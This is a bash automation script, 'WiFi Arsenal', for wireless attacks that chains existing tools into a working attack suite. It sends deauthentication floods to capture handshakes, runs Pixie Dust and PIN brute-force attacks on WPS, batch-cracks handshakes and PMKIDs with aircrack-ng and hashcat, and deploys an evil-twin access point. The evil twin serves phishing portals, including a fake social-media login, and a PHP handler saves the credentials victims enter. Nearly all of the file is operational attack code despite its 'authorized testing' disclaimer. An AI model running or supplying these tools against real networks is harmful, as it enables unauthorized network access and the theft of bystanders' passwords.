#!/bin/bash

# WiFi Arsenal - Automated Attack Suite
# Advanced automation and batch processing capabilities
# For Educational and Authorized Testing Only

# Source main script for shared functions
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/wifi_arsenal.sh" 2>/dev/null || {
    echo "Error: Cannot source main wifi_arsenal.sh script"
    exit 1
}

# Advanced automation functions
AUTO_OUTPUT_DIR="$OUTPUT_DIR/automated_attacks"
AUTO_LOG="$AUTO_OUTPUT_DIR/automation.log"

# Setup automation environment
setup_automation() {
    mkdir -p "$AUTO_OUTPUT_DIR"
    touch "$AUTO_LOG"
    echo "[$(date)] Automation suite initialized" >> "$AUTO_LOG"
}

# Automated network discovery and classification
auto_network_discovery() {
    echo -e "${CYAN}=== Automated Network Discovery ===${NC}"
    local discovery_file="$AUTO_OUTPUT_DIR/auto_discovery_$(date +%Y%m%d_%H%M%S)"
    
    echo -e "${BLUE}[*] Phase 1: Network enumeration...${NC}"
    
    # Comprehensive WiFi scan
    timeout 60 airodump-ng "$MONITOR_INTERFACE" --write "$discovery_file" --output-format csv &>/dev/null
    
    # WPS scan
    echo -e "${BLUE}[*] Phase 2: WPS enumeration...${NC}"
    timeout 30 wash -i "$MONITOR_INTERFACE" > "${discovery_file}_wps.txt" 2>/dev/null
    
    # Parse and categorize networks
    echo -e "${BLUE}[*] Phase 3: Network analysis...${NC}"
    analyze_networks "$discovery_file"
    
    echo -e "${GREEN}[✓] Automated discovery completed${NC}"
    echo "[$(date)] Automated network discovery completed" >> "$AUTO_LOG"
}

# Network analysis and categorization
analyze_networks() {
    local scan_file="$1"
    local analysis_file="${scan_file}_analysis.txt"
    
    echo "=== WiFi Arsenal - Network Analysis Report ===" > "$analysis_file"
    echo "Generated: $(date)" >> "$analysis_file"
    echo "" >> "$analysis_file"
    
    if [[ -f "${scan_file}-01.csv" ]]; then
        echo "=== OPEN NETWORKS ===" >> "$analysis_file"
        tail -n +2 "${scan_file}-01.csv" | head -n -1 | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            if [[ "$privacy" == *"OPN"* ]]; then
                echo "ESSID: $essid | BSSID: $bssid | Channel: $channel | Power: $power" >> "$analysis_file"
            fi
        done
        
        echo "" >> "$analysis_file"
        echo "=== WEP NETWORKS ===" >> "$analysis_file"
        tail -n +2 "${scan_file}-01.csv" | head -n -1 | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            if [[ "$privacy" == *"WEP"* ]]; then
                echo "ESSID: $essid | BSSID: $bssid | Channel: $channel | Power: $power" >> "$analysis_file"
            fi
        done
        
        echo "" >> "$analysis_file"
        echo "=== WPA/WPA2 NETWORKS ===" >> "$analysis_file"
        tail -n +2 "${scan_file}-01.csv" | head -n -1 | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            if [[ "$privacy" == *"WPA"* ]]; then
                echo "ESSID: $essid | BSSID: $bssid | Channel: $channel | Power: $power" >> "$analysis_file"
            fi
        done
    fi
    
    # WPS analysis
    if [[ -f "${scan_file}_wps.txt" ]]; then
        echo "" >> "$analysis_file"
        echo "=== WPS ENABLED NETWORKS ===" >> "$analysis_file"
        grep -v "^Wash" "${scan_file}_wps.txt" | while read -r line; do
            if [[ -n "$line" ]]; then
                echo "$line" >> "$analysis_file"
            fi
        done
    fi
    
    echo -e "${GREEN}[✓] Network analysis saved to $analysis_file${NC}"
}

# Automated handshake collection
auto_handshake_collection() {
    echo -e "${CYAN}=== Automated Handshake Collection ===${NC}"
    
    read -p "Enter scan file path (from discovery): " scan_file
    read -p "Enter collection time per network (seconds, default 120): " collect_time
    collect_time=${collect_time:-120}
    
    if [[ ! -f "$scan_file" ]]; then
        echo -e "${RED}[!] Scan file not found${NC}"
        return
    fi
    
    local handshake_dir="$AUTO_OUTPUT_DIR/handshakes_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$handshake_dir"
    
    echo -e "${BLUE}[*] Starting automated handshake collection...${NC}"
    
    # Process WPA networks from scan
    tail -n +2 "$scan_file" | head -n -1 | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        if [[ "$privacy" == *"WPA"* ]] && [[ -n "$bssid" ]] && [[ "$bssid" != "BSSID" ]]; then
            essid=$(echo "$essid" | tr -d ' ')
            bssid=$(echo "$bssid" | tr -d ' ')
            channel=$(echo "$channel" | tr -d ' ')
            
            if [[ -n "$essid" ]] && [[ -n "$bssid" ]]; then
                echo -e "${BLUE}[*] Targeting: $essid ($bssid) on channel $channel${NC}"
                
                local capture_file="$handshake_dir/hs_${essid}_${bssid//:/_}"
                
                # Start capture
                timeout "$collect_time" airodump-ng "$MONITOR_INTERFACE" --bssid "$bssid" -c "$channel" -w "$capture_file" &
                CAPTURE_PID=$!
                
                # Wait a bit then start deauth
                sleep 10
                aireplay-ng --deauth 20 -a "$bssid" "$MONITOR_INTERFACE" &>/dev/null &
                DEAUTH_PID=$!
                
                # Wait for capture to complete
                wait $CAPTURE_PID
                kill $DEAUTH_PID 2>/dev/null
                
                # Check if handshake was captured
                if [[ -f "${capture_file}-01.cap" ]]; then
                    if aircrack-ng "${capture_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                        echo -e "${GREEN}[✓] Handshake captured for $essid${NC}"
                        echo "[$(date)] Handshake captured: $essid ($bssid)" >> "$AUTO_LOG"
                    else
                        echo -e "${YELLOW}[!] No handshake for $essid${NC}"
                        rm -f "${capture_file}"*
                    fi
                fi
                
                sleep 5 # Brief pause between targets
            fi
        fi
    done
    
    echo -e "${GREEN}[✓] Automated handshake collection completed${NC}"
    echo -e "${BLUE}[*] Results saved in: $handshake_dir${NC}"
}

# Automated WPS attack suite
auto_wps_attacks() {
    echo -e "${CYAN}=== Automated WPS Attack Suite ===${NC}"
    
    read -p "Enter WPS scan file path: " wps_file
    read -p "Enter attack timeout per target (seconds, default 300): " attack_timeout
    attack_timeout=${attack_timeout:-300}
    
    if [[ ! -f "$wps_file" ]]; then
        echo -e "${RED}[!] WPS scan file not found${NC}"
        return
    fi
    
    local wps_results="$AUTO_OUTPUT_DIR/wps_results_$(date +%Y%m%d_%H%M%S).txt"
    echo "=== Automated WPS Attack Results ===" > "$wps_results"
    echo "Started: $(date)" >> "$wps_results"
    echo "" >> "$wps_results"
    
    # Process WPS networks
    grep -v "^Wash" "$wps_file" | while read -r bssid channel rssi wps_version wps_locked essid; do
        if [[ -n "$bssid" ]] && [[ "$wps_locked" != "Yes" ]]; then
            echo -e "${BLUE}[*] Attacking WPS network: $essid ($bssid)${NC}"
            echo "Target: $essid ($bssid) - Channel: $channel" >> "$wps_results"
            
            # Try Pixie Dust attack first
            echo -e "${BLUE}[*] Attempting Pixie Dust attack...${NC}"
            local pixie_output=$(timeout "$attack_timeout" reaver -i "$MONITOR_INTERFACE" -b "$bssid" -c "$channel" -K -N -L -vv 2>&1)
            
            if echo "$pixie_output" | grep -q "WPS PIN"; then
                local pin=$(echo "$pixie_output" | grep "WPS PIN" | awk '{print $NF}')
                echo "SUCCESS - Pixie Dust - PIN: $pin" >> "$wps_results"
                echo -e "${GREEN}[✓] Pixie Dust successful! PIN: $pin${NC}"
            else
                echo "FAILED - Pixie Dust" >> "$wps_results"
                
                # Try PIN attack as fallback
                echo -e "${BLUE}[*] Attempting PIN attack...${NC}"
                local pin_output=$(timeout "$attack_timeout" reaver -i "$MONITOR_INTERFACE" -b "$bssid" -c "$channel" -a -N -L -vv 2>&1)
                
                if echo "$pin_output" | grep -q "WPS PIN"; then
                    local pin=$(echo "$pin_output" | grep "WPS PIN" | awk '{print $NF}')
                    echo "SUCCESS - PIN Attack - PIN: $pin" >> "$wps_results"
                    echo -e "${GREEN}[✓] PIN attack successful! PIN: $pin${NC}"
                else
                    echo "FAILED - PIN Attack" >> "$wps_results"
                    echo -e "${YELLOW}[!] All WPS attacks failed for $essid${NC}"
                fi
            fi
            
            echo "" >> "$wps_results"
            echo "[$(date)] WPS attack completed on $essid ($bssid)" >> "$AUTO_LOG"
        fi
    done
    
    echo -e "${GREEN}[✓] Automated WPS attacks completed${NC}"
    echo -e "${BLUE}[*] Results saved in: $wps_results${NC}"
}

# Batch handshake cracking
batch_crack_handshakes() {
    echo -e "${CYAN}=== Batch Handshake Cracking ===${NC}"
    
    read -p "Enter handshakes directory: " hs_dir
    read -p "Enter wordlist path (default: $WORDLIST_PATH): " wordlist
    wordlist=${wordlist:-$WORDLIST_PATH}
    
    if [[ ! -d "$hs_dir" ]]; then
        echo -e "${RED}[!] Handshakes directory not found${NC}"
        return
    fi
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] Wordlist not found${NC}"
        return
    fi
    
    local crack_results="$AUTO_OUTPUT_DIR/crack_results_$(date +%Y%m%d_%H%M%S).txt"
    echo "=== Batch Handshake Cracking Results ===" > "$crack_results"
    echo "Started: $(date)" >> "$crack_results"
    echo "Wordlist: $wordlist" >> "$crack_results"
    echo "" >> "$crack_results"
    
    # Find all capture files
    find "$hs_dir" -name "*.cap" | while read -r cap_file; do
        local filename=$(basename "$cap_file")
        echo -e "${BLUE}[*] Cracking: $filename${NC}"
        echo "File: $filename" >> "$crack_results"
        
        # Attempt to crack with aircrack-ng
        local crack_output=$(timeout 600 aircrack-ng "$cap_file" -w "$wordlist" 2>&1)
        
        if echo "$crack_output" | grep -q "KEY FOUND"; then
            local password=$(echo "$crack_output" | grep "KEY FOUND" | sed 's/.*\[\(.*\)\].*/\1/')
            echo "CRACKED - Password: $password" >> "$crack_results"
            echo -e "${GREEN}[✓] CRACKED! Password: $password${NC}"
        else
            echo "FAILED" >> "$crack_results"
            echo -e "${YELLOW}[!] Failed to crack $filename${NC}"
        fi
        
        echo "" >> "$crack_results"
        echo "[$(date)] Crack attempt on $filename" >> "$AUTO_LOG"
    done
    
    echo -e "${GREEN}[✓] Batch cracking completed${NC}"
    echo -e "${BLUE}[*] Results saved in: $crack_results${NC}"
}

# Advanced PMKID collection
auto_pmkid_collection() {
    echo -e "${CYAN}=== Automated PMKID Collection ===${NC}"
    
    read -p "Enter collection duration (seconds, default 600): " duration
    duration=${duration:-600}
    
    local pmkid_file="$AUTO_OUTPUT_DIR/auto_pmkid_$(date +%Y%m%d_%H%M%S)"
    
    echo -e "${BLUE}[*] Starting PMKID collection for $duration seconds...${NC}"
    
    # Start PMKID collection
    timeout "$duration" hcxdumptool -i "$MONITOR_INTERFACE" -o "${pmkid_file}.pcapng" --enable_status=1
    
    if [[ -f "${pmkid_file}.pcapng" ]]; then
        # Convert to hashcat format
        hcxpcapngtool -o "${pmkid_file}.hc22000" "${pmkid_file}.pcapng"
        
        if [[ -f "${pmkid_file}.hc22000" ]]; then
            local pmkid_count=$(wc -l < "${pmkid_file}.hc22000")
            echo -e "${GREEN}[✓] PMKID collection completed${NC}"
            echo -e "${BLUE}[*] Collected $pmkid_count PMKIDs${NC}"
            echo -e "${BLUE}[*] File: ${pmkid_file}.hc22000${NC}"
            
            # Attempt to crack collected PMKIDs
            read -p "Attempt to crack PMKIDs now? (y/N): " -n 1 -r
            echo
            if [[ $REPLY =~ ^[Yy]$ ]]; then
                crack_pmkids "${pmkid_file}.hc22000"
            fi
        fi
    fi
    
    echo "[$(date)] PMKID collection completed" >> "$AUTO_LOG"
}

# PMKID cracking
crack_pmkids() {
    local pmkid_file="$1"
    read -p "Enter wordlist path (default: $WORDLIST_PATH): " wordlist
    wordlist=${wordlist:-$WORDLIST_PATH}
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] Wordlist not found${NC}"
        return
    fi
    
    echo -e "${BLUE}[*] Cracking PMKIDs with hashcat...${NC}"
    local results_file="${pmkid_file%.*}_cracked.txt"
    
    # Use hashcat for PMKID cracking
    hashcat -m 22000 "$pmkid_file" "$wordlist" --show > "$results_file" 2>/dev/null
    
    if [[ -s "$results_file" ]]; then
        echo -e "${GREEN}[✓] Successfully cracked PMKIDs:${NC}"
        cat "$results_file"
        echo "[$(date)] PMKIDs cracked: $(wc -l < "$results_file")" >> "$AUTO_LOG"
    else
        echo -e "${YELLOW}[!] No PMKIDs cracked${NC}"
    fi
}

# Automated evil twin deployment
auto_evil_twin() {
    echo -e "${CYAN}=== Automated Evil Twin Deployment ===${NC}"
    
    read -p "Enter target ESSID: " target_essid
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter channel: " channel
    read -p "Enter captive portal template (1=basic, 2=router, 3=social): " template
    
    local evil_dir="$AUTO_OUTPUT_DIR/evil_twin_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$evil_dir"
    
    # Create captive portal based on template
    create_captive_portal "$evil_dir" "$template"
    
    # Setup evil twin
    setup_evil_twin "$target_essid" "$channel" "$evil_dir"
    
    echo -e "${BLUE}[*] Evil Twin deployed. Monitor $evil_dir/credentials.txt for captures${NC}"
    echo "[$(date)] Evil Twin deployed: $target_essid" >> "$AUTO_LOG"
}

# Create captive portal
create_captive_portal() {
    local portal_dir="$1"
    local template="$2"
    
    mkdir -p "$portal_dir/www"
    
    case $template in
        1) # Basic template
            cat > "$portal_dir/www/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Authentication</title></head>
<body>
<h2>WiFi Network Authentication Required</h2>
<form method="post" action="auth.php">
    <p>Password: <input type="password" name="password" required></p>
    <input type="submit" value="Connect">
</form>
</body>
</html>
EOF
            ;;
        2) # Router admin template
            cat > "$portal_dir/www/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Router Configuration</title></head>
<body>
<h2>Router Configuration Panel</h2>
<form method="post" action="auth.php">
    <p>Username: <input type="text" name="username" required></p>
    <p>Password: <input type="password" name="password" required></p>
    <input type="submit" value="Login">
</form>
</body>
</html>
EOF
            ;;
        3) # Social media template
            cat > "$portal_dir/www/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Free WiFi - Social Login</title></head>
<body>
<h2>Free WiFi Access</h2>
<p>Login with your social media account for free internet access</p>
<form method="post" action="auth.php">
    <p>Email: <input type="email" name="email" required></p>
    <p>Password: <input type="password" name="password" required></p>
    <input type="submit" value="Get Free WiFi">
</form>
</body>
</html>
EOF
            ;;
    esac
    
    # Create PHP handler
    cat > "$portal_dir/www/auth.php" << EOF
<?php
\$log = fopen("../credentials.txt", "a");
\$data = date("Y-m-d H:i:s") . " - ";
foreach(\$_POST as \$key => \$value) {
    \$data .= \$key . ": " . \$value . " | ";
}
\$data .= "IP: " . \$_SERVER['REMOTE_ADDR'] . "\n";
fwrite(\$log, \$data);
fclose(\$log);
header("Location: success.html");
?>
EOF
    
    # Success page
    cat > "$portal_dir/www/success.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Connected</title></head>
<body>
<h2>Successfully Connected!</h2>
<p>You are now connected to the internet.</p>
</body>
</html>
EOF
}

# Comprehensive security assessment
full_security_assessment() {
    echo -e "${CYAN}=== Full WiFi Security Assessment ===${NC}"
    
    local assessment_dir="$AUTO_OUTPUT_DIR/full_assessment_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$assessment_dir"
    
    echo -e "${BLUE}[*] Phase 1: Network Discovery${NC}"
    auto_network_discovery
    
    echo -e "${BLUE}[*] Phase 2: WPS Assessment${NC}"
    timeout 60 wash -i "$MONITOR_INTERFACE" > "$assessment_dir/wps_scan.txt"
    
    echo -e "${BLUE}[*] Phase 3: PMKID Collection${NC}"
    timeout 300 hcxdumptool -i "$MONITOR_INTERFACE" -o "$assessment_dir/pmkid.pcapng"
    
    if [[ -f "$assessment_dir/pmkid.pcapng" ]]; then
        hcxpcapngtool -o "$assessment_dir/pmkid.hc22000" "$assessment_dir/pmkid.pcapng"
    fi
    
    echo -e "${BLUE}[*] Phase 4: Generating Assessment Report${NC}"
    generate_assessment_report "$assessment_dir"
    
    echo -e "${GREEN}[✓] Full security assessment completed${NC}"
    echo -e "${BLUE}[*] Results saved in: $assessment_dir${NC}"
}

# Generate comprehensive assessment report
generate_assessment_report() {
    local assessment_dir="$1"
    local report_file="$assessment_dir/security_assessment_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Security Assessment Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .critical { background-color: #f8d7da; border-color: #f5c6cb; }
        .high { background-color: #fff3cd; border-color: #ffeaa7; }
        .medium { background-color: #d1ecf1; border-color: #bee5eb; }
        .low { background-color: #d4edda; border-color: #c3e6cb; }
        .info { background-color: #f8f9fa; border-color: #dee2e6; }
        pre { background-color: #f8f9fa; padding: 10px; border-radius: 3px; overflow-x: auto; }
        .stats { display: flex; justify-content: space-around; text-align: center; }
        .stat-box { padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
    </style>
</head>
<body>
    <h1 class="header">WiFi Security Assessment Report</h1>
    <p><strong>Assessment Date:</strong> $(date)</p>
    <p><strong>Tool:</strong> WiFi Arsenal v2.0 - Automated Assessment</p>
    
    <div class="section info">
        <h2>Executive Summary</h2>
        <p>This report provides a comprehensive analysis of WiFi security in the assessed environment.</p>
        <div class="stats">
            <div class="stat-box">
                <h3>Networks Found</h3>
                <p>$(find "$assessment_dir" -name "*discovery*-01.csv" -exec tail -n +2 {} \; 2>/dev/null | wc -l)</p>
            </div>
            <div class="stat-box">
                <h3>WPS Enabled</h3>
                <p>$(grep -v "^Wash" "$assessment_dir/wps_scan.txt" 2>/dev/null | wc -l)</p>
            </div>
            <div class="stat-box">
                <h3>PMKIDs Captured</h3>
                <p>$(test -f "$assessment_dir/pmkid.hc22000" && wc -l < "$assessment_dir/pmkid.hc22000" || echo "0")</p>
            </div>
        </div>
    </div>
    
    <div class="section critical">
        <h2>Critical Security Issues</h2>
        <h3>Open Networks</h3>
        <pre>$(find "$assessment_dir" -name "*analysis.txt" -exec grep -A 10 "OPEN NETWORKS" {} \; 2>/dev/null)</pre>
        
        <h3>WEP Networks</h3>
        <pre>$(find "$assessment_dir" -name "*analysis.txt" -exec grep -A 10 "WEP NETWORKS" {} \; 2>/dev/null)</pre>
    </div>
    
    <div class="section high">
        <h2>High Risk Issues</h2>
        <h3>WPS Enabled Networks</h3>
        <pre>$(cat "$assessment_dir/wps_scan.txt" 2>/dev/null)</pre>
    </div>
    
    <div class="section medium">
        <h2>Medium Risk Issues</h2>
        <h3>WPA/WPA2 Networks (Potential PMKID/Handshake Attacks)</h3>
        <pre>$(find "$assessment_dir" -name "*analysis.txt" -exec grep -A 20 "WPA/WPA2 NETWORKS" {} \; 2>/dev/null)</pre>
    </div>
    
    <div class="section info">
        <h2>Technical Details</h2>
        <h3>PMKID Collection Results</h3>
        <p>PMKIDs can be used for offline password attacks against WPA/WPA2 networks.</p>
        <pre>$(test -f "$assessment_dir/pmkid.hc22000" && head -5 "$assessment_dir/pmkid.hc22000" || echo "No PMKIDs captured")</pre>
    </div>
    
    <div class="section low">
        <h2>Recommendations</h2>
        <ol>
            <li><strong>Disable WPS:</strong> Turn off WPS on all wireless access points</li>
            <li><strong>Upgrade Encryption:</strong> Use WPA3 where possible, minimum WPA2</li>
            <li><strong>Strong Passwords:</strong> Use complex passwords (>15 characters)</li>
            <li><strong>Network Isolation:</strong> Implement proper network segmentation</li>
            <li><strong>Monitor Access:</strong> Regular monitoring for unauthorized access</li>
            <li><strong>Update Firmware:</strong> Keep all network equipment updated</li>
        </ol>
    </div>
    
    <div class="section info">
        <h2>Assessment Methodology</h2>
        <ul>
            <li>Passive WiFi network enumeration</li>
            <li>WPS vulnerability scanning</li>
            <li>PMKID collection attempts</li>
            <li>Security configuration analysis</li>
        </ul>
    </div>
    
    <div class="section critical">
        <h2>Legal Disclaimer</h2>
        <p><strong>IMPORTANT:</strong> This assessment was conducted for authorized security testing purposes only. All findings should be addressed according to your organization's security policies.</p>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Assessment report generated: $report_file${NC}"
}

# Main automation menu
automation_menu() {
    print_banner
    echo -e "${CYAN}=== WiFi Arsenal - Automation Suite ===${NC}"
    echo -e "${WHITE}[1]${NC}  Automated Network Discovery"
    echo -e "${WHITE}[2]${NC}  Automated Handshake Collection"
    echo -e "${WHITE}[3]${NC}  Automated WPS Attacks"
    echo -e "${WHITE}[4]${NC}  Batch Handshake Cracking"
    echo -e "${WHITE}[5]${NC}  Automated PMKID Collection"
    echo -e "${WHITE}[6]${NC}  Automated Evil Twin"
    echo -e "${WHITE}[7]${NC}  Full Security Assessment"
    echo -e "${WHITE}[8]${NC}  View Automation Logs"
    echo -e "${WHITE}[9]${NC}  Return to Main Menu"
    echo -e "${WHITE}[10]${NC} Exit"
    echo ""
    
    read -p "Select automation option: " auto_choice
    
    case $auto_choice in
        1) auto_network_discovery ;;
        2) auto_handshake_collection ;;
        3) auto_wps_attacks ;;
        4) batch_crack_handshakes ;;
        5) auto_pmkid_collection ;;
        6) auto_evil_twin ;;
        7) full_security_assessment ;;
        8) tail -f "$AUTO_LOG" ;;
        9) return ;;
        10) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

# Initialize automation environment
setup_automation

# If script is run directly (not sourced), start automation menu
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Check if main script functions are available
    if ! command -v print_banner &> /dev/null; then
        echo "Error: Main WiFi Arsenal functions not available"
        echo "Run this script from the same directory as wifi_arsenal.sh"
        exit 1
    fi
    
    # Initialize main script environment
    check_root
    check_dependencies
    setup_environment
    get_interfaces
    enable_monitor_mode
    
    # Start automation menu
    while true; do
        automation_menu
        if [[ $auto_choice != 8 ]]; then
            echo ""
            read -p "Press Enter to continue..."
        fi
    done
fi
